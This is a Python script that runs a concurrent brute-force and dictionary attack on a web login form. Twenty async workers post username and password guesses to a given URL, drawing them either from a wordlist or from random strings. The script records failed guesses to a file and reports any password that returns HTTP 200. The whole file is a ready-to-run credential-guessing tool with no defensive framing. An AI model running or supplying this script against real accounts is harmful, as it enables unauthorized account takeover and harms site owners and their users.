
import argparse
import sys 
import aiohttp
import asyncio
import os
import random

BAD_PASS_FILEPATH= "bad_passwords.txt"

parser = argparse.ArgumentParser()

parser.add_argument("target")
parser.add_argument("url")
parser.add_argument("dictfile", nargs="?")

namespace = parser.parse_args(sys.argv[1:])

bad_pass_lock = asyncio.Lock()
dict_lock = asyncio.Lock()

bad_passwords = set()

found = False 
found_password = ""

def generate_password():
    while True: 
        attempt = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+=[]\{\}\'\".</:;\\| ,?",k=random.randint(6,22)))
        if attempt not in bad_passwords:
            return attempt 

def get_bad_passwords():
    if not os.path.exists(BAD_PASS_FILEPATH):
        return set()
    with open(BAD_PASS_FILEPATH) as bad_pass_file:
        return set(map(lambda l: l.replace("\n",""), bad_pass_file.readlines()))

async def send_login_attempt(url, username, password):
    async with aiohttp.ClientSession() as session:
        async with session.post(url=url,headers={"Content-Type":"application/x-www-form-urlencoded"}, data=f"user={username}&pass={password}&gobu=Log+In") as response:

            
            status =  response.status
            if status == 200:
                # success
                global found, found_password
                found = True
                print("found succesful password", password, "!")
                found_password = password
            else:
                async with bad_pass_lock:
                    bad_passwords.add(password)
                    with open(BAD_PASS_FILEPATH, "a") as bad_pass_file:
                        bad_pass_file.write(password+"\n")
                

async def get_password(file_handle):
    async with dict_lock:
        return file_handle.readline().replace("\n", "")


async def dict_worker( username, url, file_handle):
    password = await get_password(file_handle) 
    while password and not found:

        await send_login_attempt(url, username, password)
        password = await get_password(file_handle)

async def brute_force_worker(username,url):
    password =  generate_password();
    while password and not found:

        await send_login_attempt(url, username, password)
        password = generate_password();



async def main():
    if namespace.dictfile:
        with  open(namespace.dictfile) as dictfile:
            workers = [dict_worker( namespace.target, namespace.url, dictfile) for i in range(20)]
            await asyncio.gather(*workers)
    else:
        workers = [brute_force_worker(namespace.target, namespace.url) for i in range(20)]
        await asyncio.gather(*workers)
        


if __name__ == "__main__":
    asyncio.run(main())

